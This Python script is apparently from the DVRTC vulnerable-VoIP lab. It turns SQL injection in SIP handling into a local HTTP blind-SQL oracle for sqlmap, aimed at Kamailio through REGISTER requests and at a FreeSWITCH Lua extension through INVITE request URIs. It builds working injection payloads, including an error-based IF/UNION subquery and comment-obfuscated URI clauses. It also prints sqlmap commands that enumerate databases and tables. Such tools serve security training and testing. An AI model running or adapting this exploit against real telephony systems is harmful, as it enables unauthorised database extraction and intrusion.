#!/usr/bin/env python3
from __future__ import annotations

import argparse
from dataclasses import dataclass
import http.server
import json
import random
import re
import signal
import socketserver
import threading
import time
from urllib.parse import parse_qs, urlparse

from dvrtc_attack_common import (
    FREESWITCH_LUA_SQLI_EXTENSION,
    SipDialog,
    SipResponse,
    build_invite,
    classify_invite_responses,
    collect_sip_messages,
    final_sip_response,
    format_hostport,
    format_uri_host,
    http_get_text,
    http_url,
    is_final_invite_response,
    open_sip_session,
    probe_register,
    response_has_sdp,
    sip_codes,
)

DEFAULT_PARAMETER = "q"
DEFAULT_PBX1_EXTENSION = "1000"
DEFAULT_PBX1_TIMEOUT = 3.0
DEFAULT_PBX2_RESPONSE_WINDOW = 5.0
SQLMAP_TRUE = "TRUE"
SQLMAP_FALSE = "FALSE"
_WHITESPACE_RE = re.compile(r"\s+")


@dataclass(frozen=True)
class OracleResult:
    http_status: int
    verdict: str
    detail: str
    sip_detail: str = ""
    elapsed: float = 0.0

    def to_body(self) -> str:
        return f"{self.verdict}\n"


@dataclass(frozen=True)
class HarnessConfig:
    mode: str
    target_host: str
    extension: str
    parameter_name: str
    timeout: float
    verbose: bool


@dataclass
class HarnessStats:
    requests: int = 0
    true_count: int = 0
    false_count: int = 0
    error_count: int = 0
    total_elapsed: float = 0.0

    def update(self, verdict: str, elapsed: float) -> None:
        self.requests += 1
        self.total_elapsed += elapsed
        if verdict == SQLMAP_TRUE:
            self.true_count += 1
        elif verdict == SQLMAP_FALSE:
            self.false_count += 1
        else:
            self.error_count += 1

    def as_dict(self) -> dict[str, float]:
        avg = (self.total_elapsed / self.requests) if self.requests else 0.0
        return {
            "requests": self.requests,
            "true": self.true_count,
            "false": self.false_count,
            "error": self.error_count,
            "total_elapsed_seconds": round(self.total_elapsed, 3),
            "average_seconds": round(avg, 3),
        }

    def summary_line(self) -> str:
        avg = (self.total_elapsed / self.requests) if self.requests else 0.0
        return (
            f"requests={self.requests} true={self.true_count} false={self.false_count} "
            f"errors={self.error_count} avg={avg * 1000:.0f}ms"
        )


class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True


class SqlmapHarnessHandler(http.server.BaseHTTPRequestHandler):
    server_version = "DVRTC-SIP-SQLMap-Harness/1.0"

    def do_GET(self) -> None:  # noqa: N802
        parsed = urlparse(self.path)
        if parsed.path in {"/", ""}:
            self._handle_probe(parsed)
            return
        if parsed.path == "/healthz":
            self._respond(200, "ok\n")
            return
        if parsed.path == "/example":
            self._respond(200, self.server.example_text)  # type: ignore[attr-defined]
            return
        if parsed.path == "/stats":
            stats: HarnessStats = self.server.stats  # type: ignore[attr-defined]
            stats_lock = self.server.stats_lock  # type: ignore[attr-defined]
            with stats_lock:
                body = json.dumps(stats.as_dict(), indent=2) + "\n"
            self._respond(200, body)
            return
        self._respond(404, "not found\n")

    def log_message(self, fmt: str, *args: object) -> None:
        config: HarnessConfig = self.server.config  # type: ignore[attr-defined]
        if config.verbose:
            super().log_message(fmt, *args)

    def _handle_probe(self, parsed) -> None:
        config: HarnessConfig = self.server.config  # type: ignore[attr-defined]
        params = parse_qs(parsed.query, keep_blank_values=True)
        expression = params.get(config.parameter_name, ["1"])[0]
        probe_lock = getattr(self.server, "probe_lock", None)  # type: ignore[attr-defined]
        started = time.time()
        if probe_lock is not None:
            probe_lock.acquire()
        try:
            if config.mode == "pbx1":
                result = evaluate_pbx1_expression(
                    config.target_host,
                    expression,
                    extension=config.extension,
                    timeout=config.timeout,
                )
            else:
                result = evaluate_pbx2_expression(
                    config.target_host,
                    expression,
                    extension=config.extension,
                    response_window=config.timeout,
                )
        finally:
            if probe_lock is not None:
                probe_lock.release()
        elapsed = time.time() - started
        stats: HarnessStats = self.server.stats  # type: ignore[attr-defined]
        stats_lock = self.server.stats_lock  # type: ignore[attr-defined]
        with stats_lock:
            stats.update(result.verdict, elapsed)
        body = OracleResult(
            http_status=result.http_status,
            verdict=result.verdict,
            detail=result.detail,
            sip_detail=result.sip_detail,
            elapsed=elapsed,
        ).to_body()
        trace_path = getattr(self.server, "trace_path", None)  # type: ignore[attr-defined]
        trace_lock = getattr(self.server, "trace_lock", None)  # type: ignore[attr-defined]
        if trace_path:
            record = json.dumps(
                {
                    "ts": time.time(),
                    "verdict": result.verdict,
                    "detail": result.detail,
                    "sip": result.sip_detail,
                    "elapsed": round(elapsed, 3),
                    "expression": expression,
                }
            )
            try:
                if trace_lock is not None:
                    trace_lock.acquire()
                try:
                    with open(trace_path, "a", encoding="utf-8") as trace_file:
                        trace_file.write(record + "\n")
                finally:
                    if trace_lock is not None:
                        trace_lock.release()
            except OSError:
                pass
        self._respond(
            result.http_status,
            body,
            verdict=result.verdict,
            detail=result.detail,
            sip_detail=result.sip_detail,
        )

    def _respond(
        self,
        status: int,
        body: str,
        *,
        verdict: str = "",
        detail: str = "",
        sip_detail: str = "",
    ) -> None:
        encoded = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(encoded)))
        if verdict:
            self.send_header("X-SQLMap-Harness-Result", verdict)
        if detail:
            self.send_header("X-SQLMap-Harness-Detail", detail)
        if sip_detail:
            self.send_header("X-SQLMap-Harness-SIP", sip_detail)
        self.end_headers()
        self.wfile.write(encoded)


def info(message: str) -> None:
    print(message, flush=True)


def build_pbx1_payload(expression: str) -> str:
    # TRUE → INSERT succeeds → Kamailio returns 401 Unauthorized (normal auth challenge).
    # FALSE → multi-row subquery evaluated in scalar context → SQL error → Kamailio returns 500.
    return (
        f"seed'),"
        f"((SELECT IF(({expression}),'ok',(SELECT 1 UNION SELECT 2)))),"
        f"('tail"
    )


def build_pbx2_payload(extension: str, expression: str) -> str:
    expr = sip_uri_sql_text(expression)
    return f"{extension}'/**/AND/**/(({expr}))/**/AND/**/'1'='1"


def _parse_header_param(header_value: str, param_name: str) -> str:
    for part in header_value.split(";"):
        part = part.strip()
        if part.lower().startswith(f"{param_name.lower()}="):
            return part.split("=", 1)[1]
    return ""


def _extract_uri_from_header(header_value: str) -> str:
    s = header_value.strip()
    if "<" in s and ">" in s:
        return s[s.index("<") + 1 : s.index(">")]
    return s.split(";", 1)[0].strip()


def _build_in_dialog_request(
    method: str,
    session,
    dialog: SipDialog,
    extension: str,
    final_response: SipResponse,
    cseq: int,
) -> str:
    to_header = final_response.headers.get("to", f"<sip:{extension}@{format_uri_host(session.host)}>")
    contact_header = final_response.headers.get("contact", "")
    if contact_header:
        request_uri = _extract_uri_from_header(contact_header)
    else:
        request_uri = f"sip:{extension}@{format_uri_host(session.host)}"
    record_route = final_response.headers.get("record-route", "")
    local_hostport = format_hostport(session.local_ip, session.local_port)
    target_uri_host = format_uri_host(session.host)
    branch = f"z9hG4bK-{random.randint(100000, 999999)}"
    lines = [
        f"{method} {request_uri} SIP/2.0",
        f"Via: SIP/2.0/UDP {local_hostport};branch={branch};rport",
        "Max-Forwards: 70",
        f"To: {to_header}",
        f"From: <sip:probe@{target_uri_host}>;tag={dialog.from_tag}",
        f"Call-ID: {dialog.call_id}",
        f"CSeq: {cseq} {method}",
    ]
    if record_route:
        lines.append(f"Route: {record_route}")
    lines.extend([
        "Content-Length: 0",
        "",
        "",
    ])
    return "\r\n".join(lines)


def _probe_pbx2_invite(
    host: str,
    injected_extension: str,
    user_agent: str,
    response_window: float,
) -> list[SipResponse]:
    """Send an INVITE, collect responses, and tear down the resulting dialog."""
    with open_sip_session(host) as session:
        dialog = SipDialog.create()
        session.sock.sendto(
            build_invite(
                session.host,
                injected_extension,
                session.local_ip,
                session.local_port,
                user_agent,
                dialog=dialog,
            ).encode("utf-8"),
            session.sockaddr,
        )
        responses = collect_sip_messages(
            session.sock,
            response_window,
            stop_when=is_final_invite_response,
        )
        final = final_sip_response(responses)
        if final is not None and final.code == 200:
            try:
                session.sock.sendto(
                    _build_in_dialog_request(
                        "ACK", session, dialog, "2001", final, 1
                    ).encode("utf-8"),
                    session.sockaddr,
                )
                session.sock.sendto(
                    _build_in_dialog_request(
                        "BYE", session, dialog, "2001", final, 2
                    ).encode("utf-8"),
                    session.sockaddr,
                )
            except OSError:
                pass
        return responses


def sip_uri_sql_text(value: str) -> str:
    rewritten = value.strip().replace("!=", " IS NOT ").replace("<>", " IS NOT ")
    return _WHITESPACE_RE.sub("/**/", rewritten)


def _random_marker(prefix: str) -> str:
    return f"{prefix}_{random.randint(100000, 999999)}"


def _poll_useragent_verdict(host: str, marker: str, timeout: float) -> str | None:
    url = http_url(host, "/logs/useragents/useragents.json")
    prefix = f"{marker}:"
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            status_code, body = http_get_text(url, timeout=3.0)
            if status_code == 200:
                data = json.loads(body)
                if isinstance(data, list):
                    for item in data:
                        if not isinstance(item, dict):
                            continue
                        useragent = str(item.get("useragent", ""))
                        if useragent.startswith(prefix):
                            verdict = useragent[len(prefix) :]
                            if verdict in {SQLMAP_TRUE, SQLMAP_FALSE}:
                                return verdict
        except (json.JSONDecodeError, OSError):
            pass
        time.sleep(0.2)
    return None


def evaluate_pbx1_expression(
    host: str,
    expression: str,
    *,
    extension: str = DEFAULT_PBX1_EXTENSION,
    timeout: float = DEFAULT_PBX1_TIMEOUT,
    max_attempts: int = 3,
    retry_delay: float = 0.2,
) -> OracleResult:
    payload = build_pbx1_payload(expression)
    started = time.time()
    last_detail = "unexpected SIP outcome from boolean oracle probe"
    last_sip_detail = ""
    for attempt in range(max(1, max_attempts)):
        responses = probe_register(
            host,
            extension,
            payload,
            response_window=min(timeout, 5.0),
            stop_when=is_final_invite_response,
        )
        codes = sip_codes(responses)
        sip_detail = f"codes={codes}"
        last_sip_detail = sip_detail
        if 401 in codes:
            elapsed = time.time() - started
            return OracleResult(
                200, SQLMAP_TRUE, "boolean oracle evaluated to true", sip_detail=sip_detail, elapsed=elapsed
            )
        if 500 in codes:
            elapsed = time.time() - started
            return OracleResult(
                200, SQLMAP_FALSE, "boolean oracle evaluated to false", sip_detail=sip_detail, elapsed=elapsed
            )
        last_detail = (
            "no SIP response to REGISTER probe" if not codes else f"unexpected SIP response {codes}"
        )
        if attempt + 1 < max_attempts:
            time.sleep(retry_delay)
    elapsed = time.time() - started
    return OracleResult(200, SQLMAP_FALSE, last_detail, sip_detail=last_sip_detail, elapsed=elapsed)


def _classify_pbx2_probe(
    responses: list[SipResponse],
) -> tuple[str, str, str]:
    classification, detail = classify_invite_responses(responses)
    codes = sip_codes(responses)
    saw_183_with_sdp = any(
        response.code == 183 and response_has_sdp(response) for response in responses
    )
    sip_detail = (
        f"codes={codes}; classification={classification}; detail={detail}; "
        f"early_media={'yes' if saw_183_with_sdp else 'no'}"
    )
    if not codes:
        return "false", "no SIP response to INVITE probe", sip_detail
    final_response = final_sip_response(responses)
    if classification == "routable" and final_response is not None and final_response.code == 200:
        return "true", "boolean oracle evaluated to true", sip_detail
    if classification in {"invalid", "known-unregistered"} or (
        final_response is not None and final_response.code in {404, 480, 484, 604}
    ):
        return "false", "boolean oracle evaluated to false", sip_detail
    if final_response is not None and final_response.code >= 500:
        return "retry", f"SIP server error {final_response.code}", sip_detail
    return "retry", "ambiguous SIP outcome", sip_detail


def evaluate_pbx2_expression(
    host: str,
    expression: str,
    *,
    extension: str = FREESWITCH_LUA_SQLI_EXTENSION,
    response_window: float = DEFAULT_PBX2_RESPONSE_WINDOW,
    max_attempts: int = 3,
    retry_delay: float = 0.5,
) -> OracleResult:
    injected_extension = build_pbx2_payload(extension, expression)
    started = time.time()
    last_detail = "unexpected SIP outcome from boolean oracle probe"
    last_sip_detail = ""
    for attempt in range(max(1, max_attempts)):
        responses = _probe_pbx2_invite(
            host, injected_extension, "DVRTC-SQLMap-Harness", response_window
        )
        verdict, detail, sip_detail = _classify_pbx2_probe(responses)
        last_detail = detail
        last_sip_detail = sip_detail
        if verdict == "true":
            elapsed = time.time() - started
            return OracleResult(200, SQLMAP_TRUE, detail, sip_detail=sip_detail, elapsed=elapsed)
        if verdict == "false":
            elapsed = time.time() - started
            return OracleResult(200, SQLMAP_FALSE, detail, sip_detail=sip_detail, elapsed=elapsed)
        if attempt + 1 < max_attempts:
            time.sleep(retry_delay)
    elapsed = time.time() - started
    return OracleResult(200, SQLMAP_FALSE, last_detail, sip_detail=last_sip_detail, elapsed=elapsed)


def build_example_command(config: HarnessConfig, listen_host: str, listen_port: int) -> str:
    url = f"http://{listen_host}:{listen_port}/?{config.parameter_name}=1"
    common = f"sqlmap -u '{url}' -p {config.parameter_name} --string={SQLMAP_TRUE} --batch"
    if config.mode == "pbx1":
        return f"{common} --dbms=MySQL --technique=B --threads=1 --current-db"
    return f"{common} --dbms=SQLite --technique=B --threads=1 --tamper=between --tables"


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Expose DVRTC SIP SQL injection paths as a local HTTP blind-SQL oracle for sqlmap"
    )
    parser.add_argument("--mode", choices=["pbx1", "pbx2"], required=True)
    parser.add_argument("--host", default="127.0.0.1", help="Target DVRTC host to probe over SIP/HTTP")
    parser.add_argument("--extension", default="", help="Override the default target extension for the selected mode")
    parser.add_argument("--listen-host", default="127.0.0.1")
    parser.add_argument("--listen-port", type=int, default=17771)
    parser.add_argument("--parameter-name", default=DEFAULT_PARAMETER)
    parser.add_argument(
        "--timeout",
        type=float,
        default=0.0,
        help="Mode-specific probe timeout (pbx1 REGISTER response window, pbx2 INVITE response window)",
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Log every HTTP request (default: only print startup and shutdown messages)",
    )
    parser.add_argument(
        "--quiet",
        action="store_true",
        help=argparse.SUPPRESS,
    )
    parser.add_argument(
        "--trace-file",
        default="",
        help="Append JSON-per-line oracle trace records to this file",
    )
    parser.add_argument(
        "--allow-concurrent",
        action="store_true",
        help="Do not serialize probes (advanced; use only if you know your target is safe under concurrent SIP INVITEs)",
    )
    parser.add_argument("--print-example", action="store_true", help="Print a recommended sqlmap command and exit")
    return parser


def main() -> int:
    args = build_parser().parse_args()
    extension = args.extension or (
        DEFAULT_PBX1_EXTENSION if args.mode == "pbx1" else FREESWITCH_LUA_SQLI_EXTENSION
    )
    timeout = args.timeout or (
        DEFAULT_PBX1_TIMEOUT if args.mode == "pbx1" else DEFAULT_PBX2_RESPONSE_WINDOW
    )
    config = HarnessConfig(
        mode=args.mode,
        target_host=args.host,
        extension=extension,
        parameter_name=args.parameter_name,
        timeout=timeout,
        verbose=args.verbose,
    )
    example = build_example_command(config, args.listen_host, args.listen_port)
    if args.print_example:
        print(example)
        return 0

    stats = HarnessStats()
    server = ThreadingHTTPServer((args.listen_host, args.listen_port), SqlmapHarnessHandler)
    server.config = config  # type: ignore[attr-defined]
    server.example_text = example + "\n"  # type: ignore[attr-defined]
    server.trace_path = args.trace_file  # type: ignore[attr-defined]
    server.trace_lock = threading.Lock()  # type: ignore[attr-defined]
    server.probe_lock = None if args.allow_concurrent else threading.Lock()  # type: ignore[attr-defined]
    server.stats = stats  # type: ignore[attr-defined]
    server.stats_lock = threading.Lock()  # type: ignore[attr-defined]

    stop_once = threading.Event()

    def handle_stop(signum, _frame) -> None:
        if stop_once.is_set():
            return
        stop_once.set()
        signal_name = signal.Signals(signum).name
        info(f"[*] Received {signal_name}, shutting down sqlmap harness")
        threading.Thread(target=server.shutdown, daemon=True).start()

    old_sigint = signal.signal(signal.SIGINT, handle_stop)
    old_sigterm = signal.signal(signal.SIGTERM, handle_stop)
    info(
        f"[*] Starting sqlmap harness on http://{args.listen_host}:{args.listen_port}/ "
        f"for {args.mode} against {args.host}"
    )
    info(f"[*] Example: {example}")
    info("[*] Stats endpoint: /stats ; example endpoint: /example")
    try:
        server.serve_forever()
    finally:
        signal.signal(signal.SIGINT, old_sigint)
        signal.signal(signal.SIGTERM, old_sigterm)
        info(f"[*] Stopping sqlmap harness ({stats.summary_line()})")
        server.server_close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
